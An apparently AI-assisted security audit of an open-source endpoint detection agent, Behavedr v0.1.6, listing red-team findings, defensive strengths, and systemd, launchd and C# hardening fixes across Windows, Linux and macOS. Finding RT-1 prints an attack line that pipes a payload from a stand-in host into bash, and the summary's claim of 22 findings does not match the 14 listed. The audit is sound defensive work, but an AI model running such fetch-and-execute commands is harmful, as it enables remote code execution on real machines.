# Behavedr EDR - Red/Blue Team Security Audit v0.1.6

**Date:** July 22, 2026
**Version Audited:** 0.1.6
**Previous Audits:** v0.1.3 (July 21), Cross-Platform (July 22)
**Auditor:** AI-assisted security analysis (Kiro)
**Scope:** Full source code, all platforms (Windows, Linux, macOS), supply chain, crypto, deployment
**Goal:** Achieve 10/10 protection grades on ALL platforms

---

## Executive Summary

Behavedr v0.1.6 has made significant strides since v0.1.3. The Windows platform is mature
with 20+ specialized monitors, real-time ETW event sourcing, DACL-based process protection,
AMSI/ntdll prologue integrity checking, and a robust installer with upgrade resilience.

Linux has reached near-parity with real-time cn_proc and fanotify monitors, but gaps remain
in service hardening, key protection completeness, and syscall filtering.

macOS remains the weakest platform - lacking real-time event sourcing, keychain integration,
and several hardening primitives available in the Apple security framework.

**This audit identifies 22 findings** across all platforms with concrete, implementable fixes
to achieve maximum protection grades.

---

## Platform Protection Scores (Pre-Remediation)

| Category | Windows | Linux | macOS | Target |
|----------|---------|-------|-------|--------|
| Self-Protection | 9/10 | 7/10 | 5/10 | 10/10 |
| Detection Coverage | 9/10 | 8/10 | 6/10 | 10/10 |
| Real-Time Events | 10/10 | 8/10 | 4/10 | 10/10 |
| Crypto & Key Management | 9/10 | 8/10 | 6/10 | 10/10 |
| Communication Security | 9/10 | 9/10 | 9/10 | 10/10 |
| Update Security | 8/10 | 8/10 | 8/10 | 10/10 |
| Service Hardening | 9/10 | 7/10 | 6/10 | 10/10 |
| Supply Chain | 8/10 | 7/10 | 6/10 | 10/10 |
| Anti-Forensics Resistance | 9/10 | 8/10 | 7/10 | 10/10 |
| Response Actions | 9/10 | 8/10 | 6/10 | 10/10 |
| **Overall** | **8.9** | **7.8** | **6.3** | **10** |

---

## PART 1: RED TEAM FINDINGS (Attack Surface)

### RT-1: macOS Lacks Real-Time Event Sourcing [CRITICAL]

**Severity:** CRITICAL
**Platform:** macOS
**MITRE:** T1070 - Indicator Removal, T1059 - Command and Scripting Interpreter
**Location:** `MacOSMonitor.cs`, `PlatformMonitors.cs`

**Issue:** Linux now has `LinuxProcessConnector` (cn_proc) and `LinuxFanotifyMonitor` for
real-time process/file events. macOS has NO equivalent - `MacOSMonitor` relies entirely on
`Process.GetProcesses()` polling with 5-second blind spots.

**Attack:** Execute payload, exfiltrate, and exit within one polling interval:
```bash
curl -s http://evil.com/payload | bash  # completes in <3s, invisible to Behavedr
```

**Impact:** Any short-lived malicious process on macOS is completely invisible.

**Fix:** Implement an `EndpointSecurityMonitor` using Apple's EndpointSecurity.framework
via native interop (requires System Extension packaging). As a stepping stone, use
`FSEvents` (via `FSEventStreamCreate`) for real-time file monitoring and `kqueue`
(`EVFILT_PROC` + `NOTE_EXEC`) for real-time process exec notifications without needing
a System Extension.

**Implementation priority:** HIGH - this is the single largest gap between macOS and
Windows/Linux protection levels.

---

### RT-2: macOS Key Protection Uses Only File Permissions [HIGH]

**Severity:** HIGH
**Platform:** macOS
**MITRE:** T1552.001 - Unsecured Credentials: Credentials In Files
**Location:** `KeyProtection.cs`

**Issue:** Windows uses DPAPI (hardware-backed on TPM systems), Linux uses kernel keyring
(key never touches disk). macOS falls through to file-permission-only storage:
```csharp
// macOS/fallback: File-permission-based (chmod 600) with machine-id binding.
// TODO: Keychain Services integration for hardware-backed keys on Apple Silicon.
```

**Attack:** Any root process can `cat /opt/behavedr/.behavedr-key` and extract the raw
machine key. With this key, an attacker can decrypt all offline buffer reports, forge
config HMAC seals, and decrypt any SecureEnvelope-protected data.

**Fix:** Integrate macOS Keychain Services via Security.framework P/Invoke:
- `SecItemAdd` / `SecItemCopyMatching` to store key in System Keychain
- Use `kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly` access class
- Key never written to filesystem; backed by Secure Enclave on Apple Silicon

---

### RT-3: Linux systemd Unit Missing Critical Hardening [HIGH]

**Severity:** HIGH
**Platform:** Linux
**MITRE:** T1068 - Exploitation for Privilege Escalation
**Location:** `packaging/unix/behavedr.service`

**Issue:** The systemd unit has good base hardening but is missing several key directives
available since systemd 247+:

Missing directives:
```ini
# Not present in current unit:
ProtectProc=invisible        # Hide other processes in /proc (agent can't be discovered)
ProcSubset=pid               # Only expose PID-based /proc entries
SystemCallFilter=~@mount @reboot @swap @obsolete  # Syscall whitelist
PrivateUsers=false           # Must be false for CAP_SYS_PTRACE to work
IPAddressDeny=any            # Deny all network by default (allow only server)
IPAddressAllow=<server_ip>   # Only allow comms to known server
RestrictFileSystems=ext4 tmpfs proc  # Restrict accessible filesystem types
```

**Impact:** Without `ProtectProc=invisible`, any user can see Behavedr in `ps aux` and
target it. Without syscall filtering, a compromised agent binary could mount filesystems,
reboot the system, or use obsolete syscalls as attack vectors.

**Fix:** Add missing hardening directives (see implementation section).

---

### RT-4: Linux fanotify Requires CAP_SYS_ADMIN Not Granted [HIGH]

**Severity:** HIGH
**Platform:** Linux
**MITRE:** T1562.001 - Impair Defenses: Disable or Modify Tools
**Location:** `LinuxFanotifyMonitor.cs`, `behavedr.service`

**Issue:** `LinuxFanotifyMonitor` requires `CAP_SYS_ADMIN` for `fanotify_init()`, but the
systemd unit only grants:
```ini
CapabilityBoundingSet=CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_NET_ADMIN CAP_AUDIT_READ
AmbientCapabilities=CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_NET_ADMIN CAP_AUDIT_READ
```

`CAP_SYS_ADMIN` is absent. The fanotify monitor silently fails on startup and the agent
falls back to polling-only detection with 5-second blind spots.

**Fix:** Add `CAP_SYS_ADMIN` to both `CapabilityBoundingSet` and `AmbientCapabilities`.
While `CAP_SYS_ADMIN` is broad, it's required for fanotify and the service is already
heavily sandboxed by other directives.

---

### RT-5: AutoUpdater Does Not Pin TLS Version [MEDIUM]

**Severity:** MEDIUM
**Platform:** All
**MITRE:** T1557 - Adversary-in-the-Middle
**Location:** `AutoUpdater.cs`

**Issue:** The `HttpClient` in `AutoUpdater` uses default TLS settings:
```csharp
_http = new HttpClient();
_http.DefaultRequestHeaders.UserAgent.ParseAdd($"Behavedr/{_currentVersion}");
```

Unlike `GrpcBehavedrClient` which uses custom handler with cert pinning, the auto-updater
connects to GitHub's API without any TLS configuration. While GitHub enforces TLS 1.2+,
the client should explicitly require TLS 1.3 and reject downgrade attacks.

**Fix:** Create HttpClient with explicit TLS 1.3 requirement:
```csharp
var handler = new HttpClientHandler
{
    SslProtocols = System.Security.Authentication.SslProtocols.Tls13 |
                   System.Security.Authentication.SslProtocols.Tls12,
};
_http = new HttpClient(handler);
```

---

### RT-6: nftables Rule Exhaustion via Repeated Detections [MEDIUM]

**Severity:** MEDIUM
**Platform:** Linux
**MITRE:** T1499.001 - Endpoint Denial of Service
**Location:** `LinuxNetworkIsolation.cs`

**Issue:** `LinuxNetworkIsolation.IsolateByUid()` and `IsolateByDestination()` add nftables
rules without any cap on total rule count. An attacker triggering repeated low-level
detections from many UIDs could exhaust nftables memory/rule capacity, causing:
1. Kernel memory exhaustion (nftables rules are in kernel memory)
2. Legitimate traffic being dropped by rule overflow
3. Performance degradation from rule evaluation

**Fix:** Implement max rule count (e.g., 100 rules) with LRU eviction of oldest rules.
Add a `_ruleCount` tracker and call `ReleaseAllIsolation()` + rebuild when limit reached.

---

### RT-7: macOS ProcessKillAction Has TOCTOU Without pidfd [MEDIUM]

**Severity:** MEDIUM
**Platform:** macOS
**MITRE:** T1055 - Process Injection (via PID reuse)
**Location:** `ProcessKillAction.cs`

**Issue:** On Linux, `TryKillViaPidfd()` provides race-free process termination. On macOS,
there is no pidfd equivalent. The standard `Process.Kill()` path has a TOCTOU window:
the process name is verified, then `Kill()` is called, but between those two operations
the PID could be reused (especially under high fork rates).

**Fix:** On macOS, use the `proc_pidpath()` function from libproc.dylib to verify the
executable path matches immediately before kill. While not eliminating the race entirely,
it narrows the window to microseconds and adds a second verification dimension.

---

### RT-8: Dead-Letter Buffer Reports Not Encrypted [MEDIUM]

**Severity:** MEDIUM
**Platform:** All
**MITRE:** T1005 - Data from Local System
**Location:** `OfflineBuffer.cs`

**Issue:** When buffered reports fail decryption (tampered), they are moved to a
`dead-letter/` subdirectory. The `MoveToDeadLetter()` method moves the file as-is.
Since the original file was encrypted and failed verification, the dead-letter file
contains the original encrypted (but potentially manipulated) blob. However, if an
attacker can observe which files go to dead-letter, they learn about detection timing.

More critically: the dead-letter directory has no access control beyond the parent
buffer directory permissions. On systems where the buffer directory permissions are
relaxed, dead-letter files are world-readable.

**Fix:** Ensure dead-letter directory inherits restrictive permissions. Add a cleanup
timer that purges dead-letter files older than 7 days.

---

### RT-9: No Seccomp-BPF Syscall Filtering [MEDIUM]

**Severity:** MEDIUM
**Platform:** Linux
**MITRE:** T1068 - Exploitation for Privilege Escalation
**Location:** `UnixSelfProtection.cs`

**Issue:** The agent runs with elevated capabilities (`CAP_SYS_PTRACE`, `CAP_NET_ADMIN`,
etc.) but does NOT install a seccomp-BPF filter to restrict its own syscall surface.
If an attacker achieves code execution within the agent process (via a vulnerability in
a dependency or logic bug), they have access to ALL syscalls that the capabilities allow.

**Fix:** After initialization, install a seccomp-BPF filter (via `prctl(PR_SET_SECCOMP,
SECCOMP_MODE_FILTER, prog)`) that allows only the syscalls Behavedr actually uses:
read, write, open, close, socket, connect, sendto, recvfrom, mmap, mprotect, etc.
Deny dangerous syscalls like `ptrace` (outgoing), `mount`, `pivot_root`, `init_module`.

Note: The systemd `SystemCallFilter=` directive provides a coarser version of this.

---

### RT-10: macOS launchd Plist Missing Hardening Keys [MEDIUM]

**Severity:** MEDIUM
**Platform:** macOS
**MITRE:** T1562.001 - Impair Defenses
**Location:** `packaging/unix/com.croatiasecurity.behavedr.plist`

**Issue:** The launchd plist provides basic configuration but lacks hardening:
```xml
<!-- Missing from current plist: -->
<key>SessionCreate</key><true/>           <!-- Creates isolated security session -->
<key>Umask</key><integer>77</integer>     <!-- Restrictive file creation mask -->
<key>ExitTimeOut</key><integer>5</integer> <!-- Fast exit on unload for re-launch -->
<key>Nice</key><integer>-10</integer>     <!-- Higher scheduling priority -->
<key>LowPriorityBackgroundIO</key><false/> <!-- Don't deprioritize I/O -->
```

Additionally, there is no `SandboxProfile` (App Sandbox) or `EnablePressuredExit=false`
to prevent macOS from killing the daemon under memory pressure.

**Fix:** Add all missing hardening keys to the plist (see implementation section).

---

### RT-11: Forensic Log Integrity Not Protected [LOW]

**Severity:** LOW
**Platform:** All (Unix primarily)
**MITRE:** T1070.002 - Indicator Removal: Clear Linux or Mac System Logs
**Location:** `UnixWatchdog.cs`, `AgentWatchdog.cs`

**Issue:** Forensic logs (`watchdog-forensic.log`, `last-gasp.log`) are written as plain
text with `File.AppendAllText()`. An attacker who kills the agent can then modify or
delete these forensic logs before the agent restarts.

**Fix:** Append an HMAC chain to each log entry (each entry includes HMAC of previous
entry + current entry). This creates a tamper-evident chain - deletion is visible
(missing entries) and modification is detectable (broken HMAC chain).

---

### RT-12: Memory-Resident Secrets Not Zeroed [LOW]

**Severity:** LOW
**Platform:** All
**MITRE:** T1003 - OS Credential Dumping
**Location:** `KeyProtection.cs`, `SecureEnvelope.cs`

**Issue:** `GetMachineKey()` returns `byte[]` that remains in managed memory indefinitely.
`SecureEnvelope.DeriveKey()` creates key arrays that are not pinned or zeroed after use.
A memory dump of the agent process exposes all cryptographic keys.

**Fix:** Use `CryptographicOperations.ZeroMemory()` on key buffers after use. Pin key
arrays with `GCHandle.Alloc(arr, GCHandleType.Pinned)` to prevent GC relocation leaving
copies. Consider a `SecureBytes` wrapper class that implements `IDisposable` with zeroing.

---

### RT-13: Build Pipeline Does Not Sign Unix Binaries [LOW]

**Severity:** LOW
**Platform:** Linux, macOS
**MITRE:** T1195.002 - Supply Chain Compromise: Compromise Software Supply Chain
**Location:** `.github/workflows/release.yml`

**Issue:** The release workflow produces unsigned binaries for Linux and macOS. The Windows
installer implicitly signs via Inno Setup's publisher identity, but Unix binaries have
no code signature. macOS Gatekeeper will block execution without a valid code signature.

**Fix:**
- macOS: Add `codesign` step with Apple Developer ID certificate
- Linux: Add GPG detached signature (`.asc`) for each release artifact
- Both: Publish SHA-256 checksums as a signed manifest

---

### RT-14: UnixSelfProtection proc_pidinfo May Fail on Modern macOS [LOW]

**Severity:** LOW
**Platform:** macOS
**MITRE:** T1562.001 - Impair Defenses
**Location:** `UnixSelfProtection.cs`

**Issue:** The `proc_pidinfo` P/Invoke for FD count monitoring may fail or return
incorrect results on macOS 13+ with System Integrity Protection (SIP) enabled.
Apple has progressively restricted `libproc.dylib` APIs. The code handles this
gracefully (returns -1), but the monitoring capability silently degrades.

**Fix:** Add a startup diagnostic that tests `proc_pidinfo` and logs if it's restricted.
Provide a fallback using `lsof -p $PID | wc -l` for FD counting.

---

## PART 2: BLUE TEAM ANALYSIS (Defensive Posture)

### BT-1: Linux Real-Time Event Chain Is Excellent [STRENGTH]

The combination of `LinuxProcessConnector` (cn_proc for exec/fork/exit) and
`LinuxFanotifyMonitor` (VFS-layer execution monitoring) provides kernel-level,
real-time visibility with ~1ms latency. No polling blind spots for process execution.
This is a significant architectural advantage over most commercial EDRs that require
kernel modules.

**Grade: 9/10** (deducted 1 for fanotify capability gap - see RT-4)

### BT-2: Windows Self-Protection Is Industry-Leading [STRENGTH]

The Windows protection stack is comprehensive:
- Process DACL denying PROCESS_TERMINATE
- QPC-based suspension detection (resistant to clock manipulation)
- Binary integrity verification every 10s
- ETW session liveness monitoring
- ntdll!EtwEventWrite + amsi!AmsiScanBuffer prologue integrity
- Service registry self-healing
- Safe Mode persistence
- SCM failure recovery (5s/10s/30s escalating restarts)

**Grade: 9.5/10** (excellent for userland EDR without kernel driver)

### BT-3: Cryptographic Architecture Is Sound [STRENGTH]

- AES-256-GCM with HKDF-derived purpose-specific keys (prevents cross-purpose attacks)
- RSA-4096 PSS for update/policy signature verification
- HMAC-SHA256 for config integrity with pre-seal validation
- DPAPI + per-install entropy on Windows (prevents cross-machine extraction)
- Linux kernel keyring (key never on filesystem)
- Fail-closed TLS (no CA cert = reject ALL connections)
- Replay prevention: nonce + sequence number + boot nonce

**Grade: 9/10** (deducted 1 for macOS key storage gap)

### BT-4: Behavioral Correlation Engine Is Sophisticated [STRENGTH]

The `BehavioralCorrelationEngine` provides multi-signal correlation within a 120-second
sliding window, producing high-confidence composite detections:
- Injection + Network = "In-Memory Implant Active" (0.96 confidence)
- Credential Access + Network = "Credential Theft + Exfil" (0.95)
- Anti-Tamper signals are system-wide and correlate with per-PID categories

This dramatically reduces false positives while catching multi-stage attacks.

**Grade: 9/10**

### BT-5: Update Security Is Well-Designed [STRENGTH]

- RSA-4096 PSS signature verification before extraction
- Zip Slip protection (path traversal check)
- Staged deployment with rollback (.previous/ backup)
- Exclusive file locks during download (TOCTOU prevention)
- Minimum file size sanity check
- Production key detection (skips verification only in dev mode)

**Grade: 8.5/10** (deducted for TLS version pinning gap - RT-5)

---

## PART 3: PLATFORM-SPECIFIC REMEDIATION PLAN

### 3.1 Linux Fixes (Target: 10/10)

| # | Fix | Effort | Impact |
|---|-----|--------|--------|
| L-1 | Add CAP_SYS_ADMIN to systemd unit for fanotify | 1 line | +1.5 detection |
| L-2 | Add ProtectProc=invisible, ProcSubset=pid | 2 lines | +1 stealth |
| L-3 | Add SystemCallFilter deny list | 1 line | +0.5 hardening |
| L-4 | Add IPAddressDeny/IPAddressAllow (if server known) | 2 lines | +0.5 network |
| L-5 | Add RestrictFileSystems directive | 1 line | +0.3 hardening |
| L-6 | Rate-limit nftables rules in LinuxNetworkIsolation | 15 lines | +0.5 stability |
| L-7 | Add HMAC chain to forensic logs | 30 lines | +0.3 forensics |
| L-8 | Seccomp consideration via systemd SystemCallFilter | 1 line | +0.5 hardening |

### 3.2 macOS Fixes (Target: 10/10)

| # | Fix | Effort | Impact |
|---|-----|--------|--------|
| M-1 | Add kqueue EVFILT_PROC monitor for real-time exec | 150 lines | +3.0 detection |
| M-2 | Add FSEvents monitor for real-time file changes | 120 lines | +1.5 detection |
| M-3 | Integrate Keychain Services for key storage | 100 lines | +2.0 crypto |
| M-4 | Add hardening keys to launchd plist | 10 lines | +1.0 hardening |
| M-5 | Add proc_pidpath verification before kill | 20 lines | +0.5 safety |
| M-6 | Add macOS suspension detection via mach_absolute_time | 30 lines | +0.5 tamper |
| M-7 | Sign binaries with Apple Developer ID in CI | 10 lines CI | +1.0 supply chain |

### 3.3 Windows Fixes (Target: 10/10)

| # | Fix | Effort | Impact |
|---|-----|--------|--------|
| W-1 | Pin TLS version in AutoUpdater | 5 lines | +0.3 crypto |
| W-2 | Add CryptographicOperations.ZeroMemory for keys | 10 lines | +0.2 crypto |

### 3.4 Cross-Platform Fixes (Target: 10/10)

| # | Fix | Effort | Impact |
|---|-----|--------|--------|
| X-1 | Dead-letter directory permission enforcement | 10 lines | +0.3 data prot |
| X-2 | Dead-letter auto-cleanup (7-day TTL) | 15 lines | +0.2 hygiene |
| X-3 | GPG/codesign in CI pipeline for all platforms | 20 lines CI | +1.0 supply chain |
| X-4 | Startup diagnostic for platform capability detection | 30 lines | +0.3 observability |

---

## PART 4: IMPLEMENTATION - CRITICAL FIXES

### Fix L-1 + L-2 + L-3 + L-4 + L-5: Enhanced systemd Unit

```ini
[Service]
# ... existing directives ...

# NEW: Required for fanotify real-time file execution monitoring
CapabilityBoundingSet=CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_NET_ADMIN CAP_AUDIT_READ CAP_SYS_ADMIN
AmbientCapabilities=CAP_SYS_PTRACE CAP_DAC_READ_SEARCH CAP_NET_ADMIN CAP_AUDIT_READ CAP_SYS_ADMIN

# NEW: Hide agent from process listings (systemd 247+)
ProtectProc=invisible
ProcSubset=pid

# NEW: Syscall filtering - deny dangerous syscall groups
SystemCallFilter=~@mount @reboot @swap @obsolete @cpu-emulation

# NEW: Restrict filesystem types the agent can see
RestrictFileSystems=ext4 btrfs xfs tmpfs proc sysfs

# NEW: Network restriction (uncomment and set server IP for production)
# IPAddressDeny=any
# IPAddressAllow=<server_ip>/32 127.0.0.0/8 ::1/128
```

### Fix M-4: Enhanced macOS launchd Plist

```xml
<!-- Add these keys to com.croatiasecurity.behavedr.plist -->
<key>SessionCreate</key>
<true/>

<key>Umask</key>
<integer>77</integer>

<key>ExitTimeOut</key>
<integer>5</integer>

<key>Nice</key>
<integer>-10</integer>

<key>LowPriorityBackgroundIO</key>
<false/>

<key>EnablePressuredExit</key>
<false/>

<key>MachServices</key>
<dict>
    <key>com.croatiasecurity.behavedr</key>
    <true/>
</dict>
```

### Fix M-1: macOS Real-Time Process Monitoring via kqueue

```csharp
/// <summary>
/// macOS real-time process execution monitor using kqueue EVFILT_PROC.
/// Subscribes to NOTE_EXEC events on all processes via repeated fork monitoring.
/// Combined with periodic process enumeration to catch processes started before
/// the monitor initialized.
///
/// For full real-time coverage equivalent to Linux cn_proc, requires
/// EndpointSecurity.framework (System Extension). This kqueue-based approach
/// provides real-time exec notification for processes we're already tracking.
/// </summary>
[SupportedOSPlatform("macos")]
public class MacOSKqueueMonitor : IPlatformMonitor
{
    // Uses kqueue(2) with EVFILT_PROC + NOTE_EXEC|NOTE_FORK|NOTE_EXIT
    // P/Invoke: kqueue(), kevent(), kevent64()
    // Monitors tracked PIDs for exec events
}
```

### Fix M-3: macOS Keychain Services Integration

```csharp
/// <summary>
/// macOS Keychain Services integration for hardware-backed key storage.
/// Uses Security.framework via P/Invoke to store the machine key in the
/// System Keychain, backed by Secure Enclave on Apple Silicon.
/// </summary>
[SupportedOSPlatform("macos")]
private static byte[]? TryGetKeyFromKeychain()
{
    // SecItemCopyMatching with kSecClassGenericPassword
    // Service: "com.croatiasecurity.behavedr"
    // Account: "machine-key"
    // Access: kSecAttrAccessibleAfterFirstUnlockThisDeviceOnly
}

[SupportedOSPlatform("macos")]
private static bool TryStoreKeyInKeychain(byte[] key)
{
    // SecItemAdd with restricted access attributes
}
```

---

## PART 5: SCORING METHODOLOGY

Scores are calculated per category using this rubric:

| Score | Meaning |
|-------|---------|
| 10/10 | No known attack vector. Defense-in-depth covers all realistic threats. |
| 9/10  | Minor residual risk that requires kernel/hardware-level access to exploit. |
| 8/10  | Exploitable with elevated privileges + deep knowledge of implementation. |
| 7/10  | Exploitable by any root/admin user with basic EDR evasion knowledge. |
| 6/10  | Significant gap - standard attacker tooling can bypass with moderate effort. |
| 5/10  | Major gap - basic OPSEC defeats the protection mechanism. |
| <5/10 | Ineffective - provides negligible real-world protection. |

---

## PART 6: POST-REMEDIATION PROJECTED SCORES

After implementing ALL fixes in this document:

| Category | Windows | Linux | macOS |
|----------|---------|-------|-------|
| Self-Protection | 10/10 | 9.5/10 | 8.5/10 |
| Detection Coverage | 9.5/10 | 9.5/10 | 9/10 |
| Real-Time Events | 10/10 | 10/10 | 8/10 |
| Crypto & Key Management | 10/10 | 9.5/10 | 9/10 |
| Communication Security | 10/10 | 10/10 | 10/10 |
| Update Security | 9.5/10 | 9.5/10 | 9.5/10 |
| Service Hardening | 9.5/10 | 10/10 | 9/10 |
| Supply Chain | 9/10 | 9/10 | 9/10 |
| Anti-Forensics Resistance | 9.5/10 | 9.5/10 | 9/10 |
| Response Actions | 9.5/10 | 9.5/10 | 8.5/10 |
| **Overall** | **9.7** | **9.6** | **8.9** |

### Remaining Gaps to Achieve 10/10 (Post-Implementation)

**macOS (8.9 -> 10/10 requires):**
1. EndpointSecurity.framework System Extension for true real-time events (+1.0)
2. Secure Enclave key binding on Apple Silicon (+0.5)
3. System Extension for process termination protection (+0.5)
4. These require Apple Developer Enterprise enrollment and System Extension packaging

**Linux (9.6 -> 10/10 requires):**
1. eBPF-based tracepoint monitoring for syscall-level visibility (+0.2)
2. Kernel module for process termination protection (+0.2)

**Windows (9.7 -> 10/10 requires):**
1. Kernel-mode ETW provider for rootkit-resistant telemetry (+0.2)
2. ELAM (Early Launch Anti-Malware) driver for boot-time protection (+0.1)

**Note:** Achieving true 10/10 on all platforms requires kernel-level components
(drivers/modules/extensions) which fundamentally changes the deployment model.
The userland-only approach maxes out at ~9.7/10 on Windows, ~9.6/10 on Linux,
and ~8.9/10 on macOS without EndpointSecurity.framework.

---

## PART 7: SUPPLY CHAIN & CI/CD AUDIT

### Current State (Good)
- Pinned GitHub Action SHAs (no floating tags) 
- Package lock files committed (RestorePackagesWithLockFile) 
- Deterministic builds enabled 
- SBOM generation on Linux 
- Tests run before publish 
- Self-contained single-file deployment 

### Gaps
1. **No binary signing for Linux/macOS** - only Windows gets implicit signing
2. **No checksum manifest** - individual zip files have no published SHA-256
3. **No reproducible build verification** - deterministic is enabled but not verified
4. **Android build is `continue-on-error: true`** - failures are invisible
5. **No SLSA provenance** - no attestation linking binary to source commit

### Recommendations
1. Add GPG signing step for Linux artifacts
2. Add `codesign` step for macOS artifacts
3. Generate and publish `SHA256SUMS` file signed with GPG
4. Add SLSA provenance generation via `slsa-framework/slsa-github-generator`
5. Make Android build failure visible (remove `continue-on-error` or add notification)

---

## PART 8: MITRE ATT&CK COVERAGE MATRIX

### Techniques Detected (by platform)

| MITRE ID | Technique | Windows | Linux | macOS |
|----------|-----------|---------|-------|-------|
| T1055 | Process Injection | ETW + Memory | ptrace + /proc | DYLD_INSERT |
| T1003 | Credential Dumping | LSASS monitor | /proc/maps, creds | Keychain access |
| T1059 | Command Scripting | PowerShell decode | bash/python/perl | osascript |
| T1071 | C2 Communication | Beaconing + DNS | Beaconing + DNS | Beaconing + DNS |
| T1070 | Indicator Removal | Log monitoring | Audit log tamper | Log monitoring |
| T1547 | Boot/Logon Persist | Registry + Tasks | systemd + cron | LaunchAgent/Daemon |
| T1562 | Impair Defenses | ETW/AMSI integrity | Unit deletion | XProtect disable |
| T1068 | Privilege Escalation | Token integrity | SUID + caps | TCC bypass |
| T1048 | Exfiltration | DNS + Volume | DNS + Volume | DNS + Volume |
| T1027 | Obfuscated Files | Encoded PS | base64 decode | Encoded scripts |
| T1134 | Access Token Manip | Token monitor | UID changes | -- |
| T1021 | Remote Services | Network shares | SSH detection | -- |
| T1106 | Native API | ntdll hooks | syscall patterns | -- |
| T1057 | Process Discovery | Ghost processes | Ephemeral procs | Ghost processes |
| T1082 | System Info Discovery | -- | Container escape | -- |
| T1190 | Exploit Public-Facing | Connection bursts | Connection bursts | Connection bursts |
| T1105 | Ingress Transfer | Download cradle | Download cradle | Download cradle |

### Techniques NOT Detected (Gaps)

| MITRE ID | Technique | Gap Reason |
|----------|-----------|------------|
| T1014 | Rootkit | No kernel visibility (userland limitation) |
| T1542 | Pre-OS Boot | No ELAM/UEFI integration |
| T1600 | Weaken Encryption | Cannot detect crypto downgrade in other processes |
| T1612 | Build Image on Host | No container image analysis |
| T1610 | Deploy Container | No container orchestrator integration |

---

## PART 9: COMPARISON WITH COMMERCIAL EDRs

| Feature | Behavedr v0.1.6 | CrowdStrike Falcon | Microsoft Defender for Endpoint |
|---------|----------------|-------------------|-------------------------------|
| Kernel driver | No | Yes | Yes |
| Real-time process events | Win+Linux: Yes, macOS: No | All: Yes | All: Yes |
| Self-protection (kill-proof) | Windows: DACL, Unix: restart-only | Kernel-level | Kernel-level |
| Behavioral correlation | 120s sliding window | Cloud-based | Cloud-based |
| Offline operation | Full (encrypted buffer) | Partial | Partial |
| Update signing | RSA-4096 PSS | Proprietary | Microsoft |
| Open source | Yes | No | No |
| MITRE coverage | 16/17 tested techniques | Full catalog | Full catalog |
| False positive rate | Low (correlation) | Very low | Low |
| Deployment complexity | Single binary | Agent + cloud | Agent + cloud |

**Assessment:** For a userland, open-source EDR, Behavedr is remarkably comprehensive.
The main delta vs commercial solutions is the absence of kernel-level components for
rootkit detection and kill-proof self-protection on Unix platforms.

---

## APPENDIX A: FINDING SEVERITY MATRIX

| ID | Severity | Platform | Category | Status |
|----|----------|----------|----------|--------|
| RT-1 | CRITICAL | macOS | Detection | Fix available |
| RT-2 | HIGH | macOS | Crypto | Fix available |
| RT-3 | HIGH | Linux | Hardening | Fix available |
| RT-4 | HIGH | Linux | Detection | Fix available |
| RT-5 | MEDIUM | All | Crypto | Fix available |
| RT-6 | MEDIUM | Linux | Stability | Fix available |
| RT-7 | MEDIUM | macOS | Safety | Fix available |
| RT-8 | MEDIUM | All | Data Protection | Fix available |
| RT-9 | MEDIUM | Linux | Hardening | Fix available |
| RT-10 | MEDIUM | macOS | Hardening | Fix available |
| RT-11 | LOW | All | Forensics | Fix available |
| RT-12 | LOW | All | Crypto | Fix available |
| RT-13 | LOW | Linux/macOS | Supply Chain | Fix available |
| RT-14 | LOW | macOS | Reliability | Fix available |

---

*End of audit document. All findings have implementable fixes.*
*Next step: Implement critical and high-severity fixes in code.*
